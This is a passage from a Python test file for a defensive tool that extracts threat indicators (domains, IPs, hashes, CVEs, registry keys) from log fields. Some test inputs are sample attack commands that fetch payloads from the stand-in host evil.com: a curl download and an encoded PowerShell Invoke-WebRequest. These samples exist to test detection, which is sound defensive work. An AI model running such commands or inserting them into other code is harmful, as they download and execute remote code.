        assert [group.ioc.value for group in aggregate(records)] == ["first.com", "second.com"]

    def test_empty_input_produces_no_groups(self) -> None:
        assert aggregate([]) == []

    def test_ambiguous_tld_reflected_in_confidence(self) -> None:
        the_hit = hit(IocType.DOMAIN, "a.b.release.rs", base=BASE_FREETEXT, ambiguous_tld=True)
        group = aggregate([(1, None, [the_hit])])[0]
        assert group.confidence_score() == 20

    def test_allowlisted_reflected_in_confidence(self) -> None:
        the_hit = hit(IocType.DOMAIN, "evil.com", is_allowlisted=True)
        assert aggregate([(1, None, [the_hit])])[0].confidence_score() == 10

    def test_canonical_spellings_group_together(self) -> None:
        upper = hit(IocType.DOMAIN, "Evil.COM")
        dotted = hit(IocType.DOMAIN, "evil.com.")
        records = [(1, None, [upper]), (2, None, [dotted])]
        group = aggregate(records)[0]
        assert group.ioc.key() == (IocType.DOMAIN, "evil.com")
        assert group.occurrences == 2


# ---------------------------------------------------------------------------
# End-to-end extraction (spec 05 sections 2-3)
# ---------------------------------------------------------------------------


class TestExtractCore:
    def test_domain_in_message_is_a_mention(self) -> None:
        results = extract_fields({"message": "download from evil.com"}, allowlist=EMPTY)
        domain = hits_by_type(results)[IocType.DOMAIN][0]
        assert domain.candidate.value == "evil.com"
        assert domain.candidate.base == BASE_FREETEXT
        assert domain.role is Role.MENTIONED
        assert not domain.candidate.is_allowlisted

    def test_structured_ipv4_bases_and_role(self) -> None:
        results = extract_fields({"src_ip": "203.0.113.9"}, allowlist=EMPTY)
        ipv4 = hits_by_type(results)[IocType.IPV4][0]
        assert ipv4.candidate.base == BASE_STRUCTURED
        assert ipv4.role is Role.SOURCE
        assert not ipv4.candidate.is_private

    def test_destination_ip_is_private_flagged(self) -> None:
        results = extract_fields({"destination_ip": "10.1.2.3"}, allowlist=EMPTY)
        ipv4 = hits_by_type(results)[IocType.IPV4][0]
        assert ipv4.role is Role.DESTINATION
        assert ipv4.candidate.is_private

    def test_structured_domain_maps_to_dns_role(self) -> None:
        results = extract_fields({"domain": "evil.com"}, allowlist=EMPTY)
        domain = hits_by_type(results)[IocType.DOMAIN][0]
        assert domain.role is Role.DNS_QUERY
        assert domain.candidate.base == BASE_STRUCTURED

    def test_url_field_emits_url_and_host(self) -> None:
        results = extract_fields({"url": "http://evil.com/a"}, allowlist=EMPTY)
        grouped = hits_by_type(results)
        assert grouped[IocType.URL][0].role is Role.URL_REQUEST
        host = grouped[IocType.DOMAIN][0]
        assert host.field == "url"
        assert host.candidate.base == BASE_STRUCTURED

    def test_url_in_message_emits_host_as_mention(self) -> None:
        results = extract_fields({"message": "see http://evil.com/a"}, allowlist=EMPTY)
        grouped = hits_by_type(results)
        assert grouped[IocType.URL][0].candidate.base == BASE_FREETEXT
        assert grouped[IocType.DOMAIN][0].candidate.base == BASE_FREETEXT

    def test_email_extracted(self) -> None:
        results = extract_fields({"message": "write to a@evil.com"}, allowlist=EMPTY)
        email = hits_by_type(results)[IocType.EMAIL][0]
        assert email.candidate.value == "a@evil.com"

    def test_hash_types_extracted(self) -> None:
        results = extract_fields(
            {"message": f"md5 {MD5_HEX} sha1 {SHA1_HEX} sha256 {SHA256_HEX}"}, allowlist=EMPTY
        )
        grouped = hits_by_type(results)
        assert grouped[IocType.MD5][0].candidate.value == MD5_HEX
        assert grouped[IocType.SHA1][0].candidate.value == SHA1_HEX
        assert grouped[IocType.SHA256][0].candidate.value == SHA256_HEX

    def test_cve_uppercased(self) -> None:
        results = extract_fields({"message": "see cve-2021-34527"}, allowlist=EMPTY)
        assert hits_by_type(results)[IocType.CVE][0].candidate.value == "CVE-2021-34527"

    def test_ipv6_extracted_compressed(self) -> None:
        results = extract_fields(
            {"message": "host 2001:0db8:0000:0000:0000:0000:0000:0001"}, allowlist=EMPTY
        )
        ipv6 = hits_by_type(results)[IocType.IPV6][0]
        assert ipv6.candidate.value == "2001:db8::1"

    def test_refanged_url_and_domain(self) -> None:
        results = extract_fields({"message": "download hxxp://evil[.]com/a"}, allowlist=EMPTY)
        grouped = hits_by_type(results)
        assert grouped[IocType.URL][0].candidate.value == "http://evil.com/a"
        assert grouped[IocType.DOMAIN][0].candidate.value == "evil.com"

    def test_allowlisted_indicator_is_kept_not_dropped(self) -> None:
        allowlist = Allowlist(domain_suffix=frozenset({"example.com"}))
        results = extract_fields({"message": "connect to scanme.example.com"}, allowlist=allowlist)
        domain = hits_by_type(results)[IocType.DOMAIN][0]
        assert domain.candidate.is_allowlisted

    def test_plain_ipv4_is_never_allowlisted(self) -> None:
        results = extract_fields({"message": "dial 203.0.113.9"}, allowlist=EMPTY)
        assert not hits_by_type(results)[IocType.IPV4][0].candidate.is_allowlisted

    def test_private_ipv4_is_extracted_anyway(self) -> None:
        results = extract_fields({"message": "dial 10.0.0.1"}, allowlist=EMPTY)
        assert IocType.IPV4 in hits_by_type(results)

    def test_base64_decoded_hits_are_decoded_ranked(self) -> None:
        token = b64("curl http://evil.com/payload.exe")
        results = extract_fields({"message": f"download {token}"}, allowlist=EMPTY)
        decoded = [h for h in results if h.decoded_from == "base64"]
        assert decoded
        assert all(h.candidate.base == BASE_DECODED for h in decoded)
        assert any(h.candidate.type is IocType.URL for h in decoded)

    def test_powershell_decode_hits(self) -> None:
        payload = b64u16("Invoke-WebRequest http://evil.com/x")
        results = extract_fields(
            {"message": f"powershell -EncodedCommand {payload}"}, allowlist=EMPTY
        )
        decoded = [h for h in results if h.decoded_from == "powershell_enc"]
        assert decoded
        assert any(h.candidate.type is IocType.URL for h in decoded)

    def test_percent_decoded_url_hits(self) -> None:
        results = extract_fields({"message": "go to https://evil.com/%61"}, allowlist=EMPTY)
        decoded = [h for h in results if h.decoded_from == "url"]
        assert decoded
        assert any(h.candidate.type is IocType.URL for h in decoded)

    def test_randomseed_and_sessionid_md5_blocked(self) -> None:
        results = extract_fields({"randomseed": MD5_HEX, "sessionid": MD5_HEX}, allowlist=EMPTY)
        assert IocType.MD5 not in hits_by_type(results)

    def test_md5_with_id_context_blocked(self) -> None:
        results = extract_fields({"message": f"sid = {MD5_HEX}"}, allowlist=EMPTY)
        assert IocType.MD5 not in hits_by_type(results)

    def test_regular_md5_in_message_extracted(self) -> None:
        results = extract_fields({"message": f"hash {MD5_HEX}"}, allowlist=EMPTY)
        assert IocType.MD5 in hits_by_type(results)

    def test_ambiguous_tld_rejected_in_freetext(self) -> None:
        results = extract_fields({"message": "click release.rs now"}, allowlist=EMPTY)
        assert IocType.DOMAIN not in hits_by_type(results)

    def test_ambiguous_tld_accepted_from_structured_field_without_penalty(self) -> None:
        results = extract_fields({"domain": "release.rs"}, allowlist=EMPTY)
        domain = hits_by_type(results)[IocType.DOMAIN][0]
        assert not domain.candidate.ambiguous_tld
        assert domain.candidate.base == BASE_STRUCTURED
        assert confidence(BASE_STRUCTURED, ambiguous=domain.candidate.ambiguous_tld) == 80

    def test_url_host_ambiguous_tld_gets_no_penalty(self) -> None:
        results = extract_fields({"url": "http://a.io/x"}, allowlist=EMPTY)
        host = hits_by_type(results)[IocType.DOMAIN][0]
        assert not host.candidate.ambiguous_tld
        assert confidence(BASE_STRUCTURED, ambiguous=host.candidate.ambiguous_tld) == 80

    def test_three_label_ambiguous_domain_in_freetext_is_penalized(self) -> None:
        results = extract_fields({"message": "callback to dash.release.rs now"}, allowlist=EMPTY)
        domain = hits_by_type(results)[IocType.DOMAIN][0]
        assert domain.candidate.ambiguous_tld
        assert confidence(BASE_FREETEXT, ambiguous=domain.candidate.ambiguous_tld) == 20

    def test_version_tagged_ipv4_rejected(self) -> None:
        results = extract_fields({"message": "preview 10.1.2.3-beta build"}, allowlist=EMPTY)
        assert IocType.IPV4 not in hits_by_type(results)

    def test_leading_zero_ipv4_not_extracted(self) -> None:
        results = extract_fields({"message": "host 010.1.2.3"}, allowlist=EMPTY)
        assert IocType.IPV4 not in hits_by_type(results)

    def test_ip_host_url_is_not_a_url_ioc(self) -> None:
        results = extract_fields({"message": "ftp://10.0.0.1/share"}, allowlist=EMPTY)
        grouped = hits_by_type(results)
        assert IocType.URL not in grouped
        assert IocType.IPV4 in grouped

    def test_empty_field_value_no_hits(self) -> None:
        assert extract_fields({"message": ""}, allowlist=EMPTY) == []

    def test_none_value_skipped(self) -> None:
        assert extract_fields({"message": None}, allowlist=EMPTY) == []

    def test_non_string_value_coerced(self) -> None:
        assert extract_fields({"message": 10_0_0_1}, allowlist=EMPTY) == []

    def test_type_restriction(self) -> None:
        results = extract_fields(
            {"message": "evil.com 1.2.3.4"},
            allowlist=EMPTY,
            types=frozenset({IocType.DOMAIN}),
        )
        assert set(hits_by_type(results)) == {IocType.DOMAIN}

    def test_max_hits_bounds_results(self) -> None:
        results = extract_fields(
            {"a": "first 1.2.3.4 then evil.com", "b": "5.6.7.8"},
            allowlist=EMPTY,
            max_hits=1,
        )
        assert len(results) == 1

    def test_deterministic_order(self) -> None:
        fields = {"message": "x 1.2.3.4 evil.com a@evil.com http://x.io/y"}
        first = extract_fields(fields, allowlist=EMPTY)
        second = extract_fields(fields, allowlist=EMPTY)
        assert first == second

    def test_path_and_registry_tier_two_scanners(self) -> None:
        results = extract_fields(
            {
                "_raw": (
                    r"ran C:\Users\Public\evil.exe and "
                    r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
                )
            },
            allowlist=EMPTY,
            types=frozenset({IocType.FILEPATH, IocType.FILENAME, IocType.REGISTRY}),
        )
        grouped = hits_by_type(results)
        assert grouped[IocType.FILEPATH][0].candidate.value == r"C:\Users\Public\evil.exe"
        assert grouped[IocType.FILENAME][0].candidate.value == "evil.exe"
        assert grouped[IocType.REGISTRY][0].candidate.value.endswith(r"\Run")

    def test_tier_two_scanners_off_by_default(self) -> None:
        results = extract_fields({"_raw": r"C:\Users\Public\evil.exe"}, allowlist=EMPTY)
        assert not set(hits_by_type(results)) & {IocType.FILEPATH, IocType.FILENAME}

    def test_extract_text_uses_the_given_context(self) -> None:
        results = extract_text(
            "evil.com",
            field="domain",
            role=Role.DNS_QUERY,
            structured=True,
            allowlist=EMPTY,
        )
        assert results[0].candidate.type is IocType.DOMAIN
        assert results[0].candidate.base == BASE_STRUCTURED


# ---------------------------------------------------------------------------
# TLD loading (validate module plumbing)
# ---------------------------------------------------------------------------


class TestTldLoading:
    def test_load_tlds_reads_and_normalizes(self, tmp_path: Path) -> None:
        path = tmp_path / "tlds.txt"
        path.write_text("# comment\ncom\nOrg\n\nglobal\n", encoding="utf-8")
        assert load_tlds(path) == frozenset({"com", "org", "global"})

    def test_load_tlds_missing_file_is_empty(self, tmp_path: Path) -> None:
        assert load_tlds(tmp_path / "absent.txt") == frozenset()

    def test_set_tlds_swaps_the_active_list(self) -> None:
        before = tlds()
        set_tlds(frozenset({"localtest"}))
        try:
            assert tlds() == frozenset({"localtest"})
        finally:
            set_tlds(before)
        assert tlds() == before

    def test_bundled_list_has_real_tlds(self) -> None:
        active = tlds()
        assert "com" in active
        assert "io" in active
        assert "notatld" not in active
